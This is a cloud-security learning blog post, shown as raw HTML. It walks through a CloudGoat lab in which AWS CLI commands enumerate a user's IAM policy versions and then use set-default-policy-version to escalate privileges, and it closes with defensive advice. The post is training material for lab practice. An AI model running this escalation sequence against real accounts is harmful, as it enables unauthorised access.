<!DOCTYPE html><!--JMtuDo3EXuReSaRmaYdn1--><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/646ef98856fbea42.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-ca8ebae7f954b22a.js"/><script src="/_next/static/chunks/4bd1b696-21f374d1156f834a.js" async=""></script><script src="/_next/static/chunks/255-87b65d3beb72be65.js" async=""></script><script src="/_next/static/chunks/main-app-105e7bfa05751db9.js" async=""></script><script src="/_next/static/chunks/619-ba102abea3e3d0e4.js" async=""></script><script src="/_next/static/chunks/909-740805674b8356ef.js" async=""></script><script src="/_next/static/chunks/451-c2def8cce98c3140.js" async=""></script><script src="/_next/static/chunks/app/layout-870cdc0898a1f2e6.js" async=""></script><script src="/_next/static/chunks/app/blog/%5Bslug%5D/page-586f9b997c6ba5d5.js" async=""></script><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin=""/><title>100 Days of Cloud Security - Day 1: Attack or Defend | Gitfolio Blogger</title><meta name="description" content="Day 1 of my cloud security journey - Attack or Defend"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="32x32"/><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&amp;family=Fira+Code:wght@400;700&amp;family=Orbitron:wght@400;700&amp;display=swap" rel="stylesheet"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="font-body antialiased min-h-screen bg-background text-foreground"><div hidden=""><!--$--><!--/$--></div><script>((a,b,c,d,e,f,g,h)=>{let i=document.documentElement,j=["light","dark"];function k(b){var c;(Array.isArray(a)?a:[a]).forEach(a=>{let c="class"===a,d=c&&f?e.map(a=>f[a]||a):e;c?(i.classList.remove(...d),i.classList.add(f&&f[b]?f[b]:b)):i.setAttribute(a,b)}),c=b,h&&j.includes(c)&&(i.style.colorScheme=c)}if(d)k(d);else try{let a=localStorage.getItem(b)||c,d=g&&"system"===a?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":a;k(d)}catch(a){}})("class","theme","system",null,["light","dark"],null,true,true)</script><div class="relative flex min-h-dvh flex-col"><header class="sticky top-0 z-50 w-full border-b bg-background/95 backdrop-blur supports-[backdrop-filter]:bg-background/60"><div class="w-full px-4 md:px-8 flex h-16 items-center justify-between"><a class="flex items-center gap-2" href="/"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-cloud-lightning h-6 w-6 text-primary"><path d="M6 16.326A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 .5 8.973"></path><path d="m13 12-3 5h4l-3 5"></path></svg><span class="font-cyber text-xl font-bold text-primary">x0vrpp</span></a><div class="flex items-center gap-6"><nav class="hidden md:flex items-center gap-6"><a class="transition-colors relative text-lg md:text-sm hover:text-primary text-muted-foreground" href="/">About Me</a><a class="transition-colors relative text-lg md:text-sm hover:text-primary text-muted-foreground" href="/certifications">Certifications</a><a class="transition-colors relative text-lg md:text-sm hover:text-primary text-muted-foreground" href="/projects">Projects</a><a class="transition-colors relative text-lg md:text-sm hover:text-primary text-primary font-semibold" href="/blog">Blog<span class="absolute -bottom-2 left-1/2 -translate-x-1/2 w-2 h-2 rounded-full bg-primary hidden md:block"></span></a></nav><div class="hidden md:block"><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-accent hover:text-accent-foreground h-9 w-9 rounded-full"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sun h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-moon absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path></svg><span class="sr-only">Toggle theme</span></button></div><div class="flex items-center md:hidden gap-4"><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-accent hover:text-accent-foreground h-9 w-9 rounded-full"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-sun h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2"></path><path d="M12 20v2"></path><path d="m4.93 4.93 1.41 1.41"></path><path d="m17.66 17.66 1.41 1.41"></path><path d="M2 12h2"></path><path d="M20 12h2"></path><path d="m6.34 17.66-1.41 1.41"></path><path d="m19.07 4.93-1.41 1.41"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-moon absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path></svg><span class="sr-only">Toggle theme</span></button><button class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 hover:bg-accent hover:text-accent-foreground h-10 w-10" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-_R_n5lb_" data-state="closed"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-menu h-6 w-6"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg><span class="sr-only">Open Menu</span></button></div></div></div></header><main class="flex-1 container py-10"><article class="max-w-4xl mx-auto px-4 py-8"><header class="mb-8 text-center"><h1 class="font-headline text-3xl md:text-5xl font-bold text-primary mb-3">100 Days of Cloud Security - Day 1: Attack or Defend</h1><div class="text-muted-foreground text-sm md:text-base"><span>By <!-- -->Venkata Pathuri<!-- --> on </span><time dateTime="2025-11-10">November 10, 2025</time></div></header><div data-orientation="horizontal" role="none" class="shrink-0 bg-border h-[1px] w-full my-8"></div><div class="prose prose-lg dark:prose-invert max-w-none prose-headings:text-primary prose-a:text-primary"><h1>Day 1: Attack or Defend</h1>
<h2>Overview</h2>
<p>Welcome to the first day of our 100-day cloud security journey! Today, we kick things off with an exciting challenge: should we adopt an offensive posture and attack first, or take a defensive approach? This exploration is not just theoretical; itâ€™s a practical dive into the vulnerabilities inherent in cloud environments, specifically focusing on AWS Identity and Access Management (IAM). By deploying a CloudGoat scenario, weâ€™ll learn firsthand how to identify and exploit weaknesses, setting the stage for effective defenses. This foundational knowledge builds on our preliminary understanding of cloud security from Day 0, where we established the importance of proactive security measures.</p>
<h2>Learning Objectives</h2>
<p>By the end of todayâ€™s session, you will master the process of identifying IAM vulnerabilities and exploiting them to escalate privileges. Youâ€™ll also gain insights into the effectiveness of attacking versus defending in cloud security contexts. More importantly, youâ€™ll understand how to implement these lessons in real-world scenarios, enhancing your skills as a cloud security professional.</p>
<h2>Deep Dive</h2>
<p>In our CloudGoat scenario, <code>iam_privesc_by_rollback</code>, our objective is clear: escalate privileges for the <code>raynor</code> user by restoring a previous version of a managed policy. This scenario highlights a common pitfall in IAM managementâ€”overlooked policy versions that can be exploited for privilege escalation.</p>
<h3>Understanding IAM and Policy Versions</h3>
<p>AWS IAM allows you to manage access to AWS services and resources securely. Policies govern user permissions, and each managed policy can have multiple versions. The ability to roll back to a previous policy version can be a double-edged sword; while it provides flexibility in managing policies, it can also lead to security risks if proper controls are not in place.</p>
<p><strong>Real-World Example:</strong><br>
Consider a company that frequently updates its IAM policies to fine-tune user permissions. If an administrator inadvertently leaves a powerful version of a policy accessible, attackers could exploit this oversight to gain unauthorized access, potentially leading to data breaches or service disruptions.</p>
<h3>Step-by-Step Breakdown</h3>
<ol>
<li>
<p><strong>Confirm Your Identity:</strong> Start by ensuring you are operating under the correct AWS credentials. Use the command:</p>
<pre><code class="language-bash">aws sts get-caller-identity --profile cloudgoat
</code></pre>
<p>You should see your AWS account details, confirming your identity.</p>
</li>
<li>
<p><strong>List IAM Users:</strong> Next, examine the IAM users in your account:</p>
<pre><code class="language-bash">aws iam list-users --profile cloudgoat
</code></pre>
<p>This will help you identify the user youâ€™re working with.</p>
</li>
<li>
<p><strong>Explore Policies:</strong> Check both inline and managed policies attached to the <code>raynor</code> user:</p>
<pre><code class="language-bash">aws iam list-user-policies --user-name "raynor-cgiddrtz03apx6" --profile cloudgoat
aws iam list-attached-user-policies --user-name "raynor-cgiddrtz03apx6" --profile cloudgoat
</code></pre>
</li>
<li>
<p><strong>Get Policy Metadata:</strong> Identify the current default version of the managed policy:</p>
<pre><code class="language-bash">aws iam get-policy --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --query 'Policy' --profile cloudgoat
</code></pre>
</li>
<li>
<p><strong>List Policy Versions:</strong> Retrieve all versions of the policy to find the one you can exploit:</p>
<pre><code class="language-bash">aws iam list-policy-versions --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --profile cloudgoat
</code></pre>
</li>
<li>
<p><strong>View Specific Versions:</strong> Examine the policy documents for versions that grant additional permissions:</p>
<pre><code class="language-bash">aws iam get-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --version-id v1 --profile cloudgoat
</code></pre>
</li>
<li>
<p><strong>Set Default Policy Version:</strong> Finally, to escalate privileges, set a more permissive version as default:</p>
<pre><code class="language-bash">aws iam set-default-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --version-id v3 --profile cloudgoat
</code></pre>
</li>
</ol>
<p><strong>Common Pitfalls:</strong></p>
<ul>
<li>Always perform these exercises in an isolated lab environment to prevent unintended consequences in production accounts.</li>
<li>Ensure you have the appropriate permissions to execute these commands; otherwise, you will encounter access denied errors.</li>
</ul>
<h2>Hands-On Practice</h2>
<p>Following the outlined commands will allow you to practice privilege escalation in a controlled environment. Verify your success by checking the default policy version after executing the <code>set-default-policy-version</code> command. You should see the updated version reflected in your policy metadata.</p>
<h2>Key Takeaways</h2>
<p>Today, we learned that understanding and exploiting IAM policy versions can lead to significant security vulnerabilities. By approaching cloud security from an attackerâ€™s perspective, we gain critical insights into potential weaknesses, equipping us to build stronger defenses. We also recognized the importance of using isolated environments for testing to maintain the integrity of our production accounts.</p>
<h2>Real-World Applications</h2>
<p>In real-world scenarios, organizations frequently face challenges with IAM misconfigurations. Regular audits and using tools like AWS IAM Access Analyzer can help identify risks before they are exploited. Additionally, implementing strict controls over policy version management can significantly enhance security posture.</p>
<h2>What's Next?</h2>
<p>As we move into Day 2, weâ€™ll build on todayâ€™s lessons by exploring automated tools that can help detect IAM vulnerabilities before they can be exploited. Get ready for a deeper dive into cloud security assessments and how to proactively safeguard your cloud environments!</p>
<hr>
<p><strong>Journey Progress:</strong> 1/100 Days Complete ðŸš€</p>
</div></article><!--$--><!--/$--></main><footer class="border-t"><div class="container flex flex-col items-center justify-center gap-4 py-8 md:h-24 md:flex-row"><div class="flex flex-col items-center gap-4 px-8 md:flex-row md:gap-2 md:px-0"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-cloud-lightning h-6 w-6 text-primary"><path d="M6 16.326A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 .5 8.973"></path><path d="m13 12-3 5h4l-3 5"></path></svg><p class="text-center text-sm leading-loose text-muted-foreground md:text-left">Â© <!-- -->2025<!-- --> Venkata Pathuri. All Rights Reserved.</p></div></div></footer></div><div role="region" aria-label="Notifications (F8)" tabindex="-1" style="pointer-events:none"><ol tabindex="-1" class="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"></ol></div><script src="/_next/static/chunks/webpack-ca8ebae7f954b22a.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[1458,[\"619\",\"static/chunks/619-ba102abea3e3d0e4.js\",\"909\",\"static/chunks/909-740805674b8356ef.js\",\"451\",\"static/chunks/451-c2def8cce98c3140.js\",\"177\",\"static/chunks/app/layout-870cdc0898a1f2e6.js\"],\"ThemeProvider\"]\n3:I[6970,[\"619\",\"static/chunks/619-ba102abea3e3d0e4.js\",\"909\",\"static/chunks/909-740805674b8356ef.js\",\"451\",\"static/chunks/451-c2def8cce98c3140.js\",\"177\",\"static/chunks/app/layout-870cdc0898a1f2e6.js\"],\"default\"]\n4:I[9766,[],\"\"]\n5:I[8924,[],\"\"]\n6:I[704,[\"619\",\"static/chunks/619-ba102abea3e3d0e4.js\",\"909\",\"static/chunks/909-740805674b8356ef.js\",\"451\",\"static/chunks/451-c2def8cce98c3140.js\",\"177\",\"static/chunks/app/layout-870cdc0898a1f2e6.js\"],\"Toaster\"]\n8:I[4431,[],\"OutletBoundary\"]\na:I[5278,[],\"AsyncMetadataOutlet\"]\nc:I[4431,[],\"ViewportBoundary\"]\ne:I[4431,[],\"MetadataBoundary\"]\nf:\"$Sreact.suspense\"\n11:I[7150,[],\"\"]\n:HL[\"/_next/static/css/646ef98856fbea42.css\",\"style\"]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"JMtuDo3EXuReSaRmaYdn1\",\"p\":\"\",\"c\":[\"\",\"blog\",\"100-days-of-cloud-security-day-01\"],\"i\":false,\"f\":[[[\"\",{\"children\":[\"blog\",{\"children\":[[\"slug\",\"100-days-of-cloud-security-day-01\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[\"\",[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/css/646ef98856fbea42.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[[\"$\",\"head\",null,{\"children\":[[\"$\",\"link\",null,{\"rel\":\"preconnect\",\"href\":\"https://fonts.googleapis.com\"}],[\"$\",\"link\",null,{\"rel\":\"preconnect\",\"href\":\"https://fonts.gstatic.com\",\"crossOrigin\":\"\"}],[\"$\",\"link\",null,{\"href\":\"https://fonts.googleapis.com/css2?family=Inter:wght@400;700\u0026family=Fira+Code:wght@400;700\u0026family=Orbitron:wght@400;700\u0026display=swap\",\"rel\":\"stylesheet\"}]]}],[\"$\",\"body\",null,{\"className\":\"font-body antialiased min-h-screen bg-background text-foreground\",\"children\":[\"$\",\"$L2\",null,{\"attribute\":\"class\",\"defaultTheme\":\"system\",\"enableSystem\":true,\"disableTransitionOnChange\":true,\"children\":[[\"$\",\"div\",null,{\"className\":\"relative flex min-h-dvh flex-col\",\"children\":[[\"$\",\"$L3\",null,{}],[\"$\",\"main\",null,{\"className\":\"flex-1 container py-10\",\"children\":[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"footer\",null,{\"className\":\"border-t\",\"children\":[\"$\",\"div\",null,{\"className\":\"container flex flex-col items-center justify-center gap-4 py-8 md:h-24 md:flex-row\",\"children\":[\"$\",\"div\",null,{\"className\":\"flex flex-col items-center gap-4 px-8 md:flex-row md:gap-2 md:px-0\",\"children\":[[\"$\",\"svg\",null,{\"ref\":\"$undefined\",\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":24,\"height\":24,\"viewBox\":\"0 0 24 24\",\"fill\":\"none\",\"stroke\":\"currentColor\",\"strokeWidth\":2,\"strokeLinecap\":\"round\",\"strokeLinejoin\":\"round\",\"className\":\"lucide lucide-cloud-lightning h-6 w-6 text-primary\",\"children\":[[\"$\",\"path\",\"1cez44\",{\"d\":\"M6 16.326A7 7 0 1 1 15.71 8h1.79a4.5 4.5 0 0 1 .5 8.973\"}],[\"$\",\"path\",\"1t22er\",{\"d\":\"m13 12-3 5h4l-3 5\"}],\"$undefined\"]}],[\"$\",\"p\",null,{\"className\":\"text-center text-sm leading-loose text-muted-foreground md:text-left\",\"children\":[\"Â© \",2025,\" Venkata Pathuri. All Rights Reserved.\"]}]]}]}]}]]}],[\"$\",\"$L6\",null,{}]]}]}]]}]]}],{\"children\":[\"blog\",[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"slug\",\"100-days-of-cloud-security-day-01\",\"d\"],[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L4\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L5\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[\"__PAGE__\",[\"$\",\"$1\",\"c\",{\"children\":[\"$L7\",null,[\"$\",\"$L8\",null,{\"children\":[\"$L9\",[\"$\",\"$La\",null,{\"promise\":\"$@b\"}]]}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],null],[\"$\",\"$Le\",null,{\"children\":[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$f\",null,{\"fallback\":null,\"children\":\"$L10\"}]}]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$11\",[]],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"12:I[8474,[\"909\",\"static/chunks/909-740805674b8356ef.js\",\"953\",\"static/chunks/app/blog/%5Bslug%5D/page-586f9b997c6ba5d5.js\"],\"Separator\"]\n13:T18ec,"])</script><script>self.__next_f.push([1,"\u003ch1\u003eDay 1: Attack or Defend\u003c/h1\u003e\n\u003ch2\u003eOverview\u003c/h2\u003e\n\u003cp\u003eWelcome to the first day of our 100-day cloud security journey! Today, we kick things off with an exciting challenge: should we adopt an offensive posture and attack first, or take a defensive approach? This exploration is not just theoretical; itâ€™s a practical dive into the vulnerabilities inherent in cloud environments, specifically focusing on AWS Identity and Access Management (IAM). By deploying a CloudGoat scenario, weâ€™ll learn firsthand how to identify and exploit weaknesses, setting the stage for effective defenses. This foundational knowledge builds on our preliminary understanding of cloud security from Day 0, where we established the importance of proactive security measures.\u003c/p\u003e\n\u003ch2\u003eLearning Objectives\u003c/h2\u003e\n\u003cp\u003eBy the end of todayâ€™s session, you will master the process of identifying IAM vulnerabilities and exploiting them to escalate privileges. Youâ€™ll also gain insights into the effectiveness of attacking versus defending in cloud security contexts. More importantly, youâ€™ll understand how to implement these lessons in real-world scenarios, enhancing your skills as a cloud security professional.\u003c/p\u003e\n\u003ch2\u003eDeep Dive\u003c/h2\u003e\n\u003cp\u003eIn our CloudGoat scenario, \u003ccode\u003eiam_privesc_by_rollback\u003c/code\u003e, our objective is clear: escalate privileges for the \u003ccode\u003eraynor\u003c/code\u003e user by restoring a previous version of a managed policy. This scenario highlights a common pitfall in IAM managementâ€”overlooked policy versions that can be exploited for privilege escalation.\u003c/p\u003e\n\u003ch3\u003eUnderstanding IAM and Policy Versions\u003c/h3\u003e\n\u003cp\u003eAWS IAM allows you to manage access to AWS services and resources securely. Policies govern user permissions, and each managed policy can have multiple versions. The ability to roll back to a previous policy version can be a double-edged sword; while it provides flexibility in managing policies, it can also lead to security risks if proper controls are not in place.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eReal-World Example:\u003c/strong\u003e\u003cbr\u003e\nConsider a company that frequently updates its IAM policies to fine-tune user permissions. If an administrator inadvertently leaves a powerful version of a policy accessible, attackers could exploit this oversight to gain unauthorized access, potentially leading to data breaches or service disruptions.\u003c/p\u003e\n\u003ch3\u003eStep-by-Step Breakdown\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eConfirm Your Identity:\u003c/strong\u003e Start by ensuring you are operating under the correct AWS credentials. Use the command:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws sts get-caller-identity --profile cloudgoat\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou should see your AWS account details, confirming your identity.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eList IAM Users:\u003c/strong\u003e Next, examine the IAM users in your account:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws iam list-users --profile cloudgoat\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis will help you identify the user youâ€™re working with.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eExplore Policies:\u003c/strong\u003e Check both inline and managed policies attached to the \u003ccode\u003eraynor\u003c/code\u003e user:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws iam list-user-policies --user-name \"raynor-cgiddrtz03apx6\" --profile cloudgoat\naws iam list-attached-user-policies --user-name \"raynor-cgiddrtz03apx6\" --profile cloudgoat\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGet Policy Metadata:\u003c/strong\u003e Identify the current default version of the managed policy:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws iam get-policy --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --query 'Policy' --profile cloudgoat\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eList Policy Versions:\u003c/strong\u003e Retrieve all versions of the policy to find the one you can exploit:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws iam list-policy-versions --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --profile cloudgoat\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eView Specific Versions:\u003c/strong\u003e Examine the policy documents for versions that grant additional permissions:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws iam get-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --version-id v1 --profile cloudgoat\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSet Default Policy Version:\u003c/strong\u003e Finally, to escalate privileges, set a more permissive version as default:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-bash\"\u003eaws iam set-default-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-cgiddrtz03apx6 --version-id v3 --profile cloudgoat\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eCommon Pitfalls:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAlways perform these exercises in an isolated lab environment to prevent unintended consequences in production accounts.\u003c/li\u003e\n\u003cli\u003eEnsure you have the appropriate permissions to execute these commands; otherwise, you will encounter access denied errors.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2\u003eHands-On Practice\u003c/h2\u003e\n\u003cp\u003eFollowing the outlined commands will allow you to practice privilege escalation in a controlled environment. Verify your success by checking the default policy version after executing the \u003ccode\u003eset-default-policy-version\u003c/code\u003e command. You should see the updated version reflected in your policy metadata.\u003c/p\u003e\n\u003ch2\u003eKey Takeaways\u003c/h2\u003e\n\u003cp\u003eToday, we learned that understanding and exploiting IAM policy versions can lead to significant security vulnerabilities. By approaching cloud security from an attackerâ€™s perspective, we gain critical insights into potential weaknesses, equipping us to build stronger defenses. We also recognized the importance of using isolated environments for testing to maintain the integrity of our production accounts.\u003c/p\u003e\n\u003ch2\u003eReal-World Applications\u003c/h2\u003e\n\u003cp\u003eIn real-world scenarios, organizations frequently face challenges with IAM misconfigurations. Regular audits and using tools like AWS IAM Access Analyzer can help identify risks before they are exploited. Additionally, implementing strict controls over policy version management can significantly enhance security posture.\u003c/p\u003e\n\u003ch2\u003eWhat's Next?\u003c/h2\u003e\n\u003cp\u003eAs we move into Day 2, weâ€™ll build on todayâ€™s lessons by exploring automated tools that can help detect IAM vulnerabilities before they can be exploited. Get ready for a deeper dive into cloud security assessments and how to proactively safeguard your cloud environments!\u003c/p\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cstrong\u003eJourney Progress:\u003c/strong\u003e 1/100 Days Complete ðŸš€\u003c/p\u003e\n"])</script><script>self.__next_f.push([1,"7:[\"$\",\"article\",null,{\"className\":\"max-w-4xl mx-auto px-4 py-8\",\"children\":[[\"$\",\"header\",null,{\"className\":\"mb-8 text-center\",\"children\":[[\"$\",\"h1\",null,{\"className\":\"font-headline text-3xl md:text-5xl font-bold text-primary mb-3\",\"children\":\"100 Days of Cloud Security - Day 1: Attack or Defend\"}],[\"$\",\"div\",null,{\"className\":\"text-muted-foreground text-sm md:text-base\",\"children\":[[\"$\",\"span\",null,{\"children\":[\"By \",\"Venkata Pathuri\",\" on \"]}],[\"$\",\"time\",null,{\"dateTime\":\"2025-11-10\",\"children\":\"November 10, 2025\"}]]}]]}],[\"$\",\"$L12\",null,{\"className\":\"my-8\"}],[\"$\",\"div\",null,{\"className\":\"prose prose-lg dark:prose-invert max-w-none prose-headings:text-primary 